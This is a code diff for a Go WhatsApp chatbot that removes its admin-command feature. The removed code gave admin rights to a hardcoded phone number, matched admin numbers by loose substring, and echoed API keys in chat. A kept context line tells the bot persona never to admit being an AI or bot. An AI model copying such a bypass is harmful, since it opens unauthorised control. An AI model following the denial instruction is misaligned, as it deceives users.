@@ -186,15 +186,8 @@ func ProcessMessage(
 		return // STOP – first matching rule wins
 	}
 
-	// ── 2. Master Admin Direct Command Interception ─────────────────────────
-	if isAdminNumber(phone, aiCfg.AdminNumbers) {
-		if handled := handleAdminCommand(ctx, client, repo, aiCfg, from, phone, text); handled {
-			return
-		}
-	}
-
-	// ── 3. AI Fallback (Runs for ALL chats when no Auto-Reply rule matches) ──
-	if !aiCfg.Enabled && !isAdminNumber(phone, aiCfg.AdminNumbers) {
+	// ── 2. AI Fallback (Runs for ALL chats when no Auto-Reply rule matches) ──
+	if !aiCfg.Enabled {
 		logrus.Infof("[BOT] no auto-reply matched and AI is disabled for %s", from)
 		return
 	}
@@ -367,130 +360,6 @@ func parseJID(s string) (types.JID, error) {
 	return jid.ToNonAD(), nil
 }
 
-func isAdminNumber(phone string, adminNums []string) bool {
-	phone = strings.TrimSpace(phone)
-	if phone == "6282392115909" {
-		return true
-	}
-	for _, a := range adminNums {
-		a = strings.TrimSpace(a)
-		if a != "" && (a == phone || strings.Contains(phone, a)) {
-			return true
-		}
-	}
-	return false
-}
-
-func handleAdminCommand(ctx context.Context, client *whatsmeow.Client, repo domainBot.IBotRepository, aiCfg *domainBot.AIConfig, from, phone, text string) bool {
-	cmd := strings.TrimSpace(text)
-	lower := strings.ToLower(cmd)
-
-	if lower == "/helpadmin" || lower == "/admin" {
-		reply := "👑 *MENU MASTER ADMIN CONTROL (6282392115909)* 👑\n\n" +
-			"1. `/status` - Cek status bot & total key aktif\n" +
-			"2. `/addkey <gsk_...>` - Tambah Groq API Key baru\n" +
-			"3. `/mute <nomor> [1h|24h|7d|permanent]` - Nonaktifkan AI untuk kontak\n" +
-			"4. `/unmute <nomor>` - Aktifkan kembali AI kontak\n" +
-			"5. `/setprompt <nomor> <prompt>` - Set prompt persona khusus per nomor\n" +
-			"6. `/setmodel <model>` - Ubah model AI Groq\n\n" +
-			"💡 *Anda juga bisa mengobrol biasa*, AI mengenali Anda sebagai Master Admin dan mengeksekusi instruksi Anda!"
-		_ = sendTextMessage(client, from, reply)
-		return true
-	}
-
-	if lower == "/status" {
-		keysCount := len(parseGroqKeys(aiCfg.APIKey))
-		mutedCount := len(aiCfg.BlockedNumbers)
-		reply := fmt.Sprintf("📊 *STATUS MASTER ADMIN BOT*\n\n"+
-			"🟢 Status AI: %t\n"+
-			"🤖 Provider: %s\n"+
-			"🧠 Model: %s\n"+
-			"🔑 Key Groq Aktif: %d Key\n"+
-			"🚫 Muted Kontak: %d Nomor\n"+
-			"💖 Custom Prompts: %d Nomor\n"+
-			"⏱️ Cooldown: %d ms",
-			aiCfg.Enabled, aiCfg.Provider, aiCfg.Model, keysCount, mutedCount, len(aiCfg.CustomNumberPrompts), aiCfg.CooldownMs)
-		_ = sendTextMessage(client, from, reply)
-		return true
-	}
-
-	if strings.HasPrefix(lower, "/addkey ") {
-		newKey := strings.TrimSpace(cmd[8:])
-		if newKey != "" {
-			if aiCfg.APIKey != "" {
-				aiCfg.APIKey = aiCfg.APIKey + "\n" + newKey
-			} else {
-				aiCfg.APIKey = newKey
-			}
-			_, _ = repo.UpsertAIConfig(ctx, *aiCfg)
-			reply := fmt.Sprintf("✅ *KEY GROQ BARU BERHASIL DITAMBAHKAN!*\n\nKey: `%s`\nTotal Key Aktif Saat Ini: %d Key.", newKey, len(parseGroqKeys(aiCfg.APIKey)))
-			_ = sendTextMessage(client, from, reply)
-			return true
-		}
-	}
-
-	if strings.HasPrefix(lower, "/mute ") {
-		parts := strings.Fields(cmd[6:])
-		if len(parts) >= 1 {
-			targetPhone := parts[0]
-			dur := "permanent"
-			if len(parts) >= 2 {
-				dur = parts[1]
-			}
-			var expireIso string
-			now := time.Now().UTC()
-			if dur == "1h" {
-				expireIso = now.Add(1 * time.Hour).Format(time.RFC3339)
-			} else if dur == "24h" || dur == "1d" {
-				expireIso = now.Add(24 * time.Hour).Format(time.RFC3339)
-			} else if dur == "7d" {
-				expireIso = now.Add(7 * 24 * time.Hour).Format(time.RFC3339)
-			}
-			entry := targetPhone
-			if expireIso != "" {
-				entry = targetPhone + "|" + expireIso
-			}
-			aiCfg.BlockedNumbers = append(aiCfg.BlockedNumbers, entry)
-			_, _ = repo.UpsertAIConfig(ctx, *aiCfg)
-			reply := fmt.Sprintf("🚫 *AI BERHASIL DINONAKTIFKAN UNTUK %s*\nDurasi: %s", targetPhone, dur)
-			_ = sendTextMessage(client, from, reply)
-			return true
-		}
-	}
-
-	if strings.HasPrefix(lower, "/unmute ") {
-		targetPhone := strings.TrimSpace(cmd[8:])
-		var newBlocked []string
-		for _, b := range aiCfg.BlockedNumbers {
-			if !strings.HasPrefix(b, targetPhone) {
-				newBlocked = append(newBlocked, b)
-			}
-		}
-		aiCfg.BlockedNumbers = newBlocked
-		_, _ = repo.UpsertAIConfig(ctx, *aiCfg)
-		reply := fmt.Sprintf("✅ *AI DIAKTIFKAN KEMBALI UNTUK %s*", targetPhone)
-		_ = sendTextMessage(client, from, reply)
-		return true
-	}
-
-	if strings.HasPrefix(lower, "/setprompt ") {
-		parts := strings.SplitN(cmd[11:], " ", 2)
-		if len(parts) == 2 {
-			targetPhone := strings.TrimSpace(parts[0])
-			customPrompt := strings.TrimSpace(parts[1])
-			if aiCfg.CustomNumberPrompts == nil {
-				aiCfg.CustomNumberPrompts = make(map[string]string)
-			}
-			aiCfg.CustomNumberPrompts[targetPhone] = customPrompt
-			_, _ = repo.UpsertAIConfig(ctx, *aiCfg)
-			reply := fmt.Sprintf("💖 *PROMPT KHUSUS BERHASIL DISIMPAN UNTUK %s*\n\nPrompt: %s", targetPhone, customPrompt)
-			_ = sendTextMessage(client, from, reply)
-			return true
-		}
-	}
-
-	return false
-}
 
 func callAI(ctx context.Context, cfg *domainBot.AIConfig, userMessage, senderPhone string) (string, error) {
 	if cfg == nil {
@@ -562,12 +431,6 @@ func callAI(ctx context.Context, cfg *domainBot.AIConfig, userMessage, senderPho
 			"Jangan pernah keluar dari peran ini, jangan mengaku sebagai AI atau bot, "+
 			"jawab selalu sesuai karakter yang diperintahkan.",
 			normalizedPhone, customPromptFound)
-	} else if isAdminNumber(normalizedPhone, cfg.AdminNumbers) {
-		// ── 2. Admin privilege (only when no custom prompt) ──
-		systemPrompt = fmt.Sprintf("[HAK AKSES HIERARKI: MASTER ADMIN OWNER (%s)]:\n"+
-			"Pengirim pesan ini adalah MASTER ADMIN UTAMA / OWNER BOT (%s).\n"+
-			"Pengirim memiliki wewenang penuh atas seluruh konfigurasi bot. Berikan layanan terbaik, hormati instruksi admin, dan bantu atur jadwal/fitur secara fleksibel.\n\n"+
-			"%s", normalizedPhone, normalizedPhone, systemPrompt)
 	}
 
 	if systemPrompt == "" {
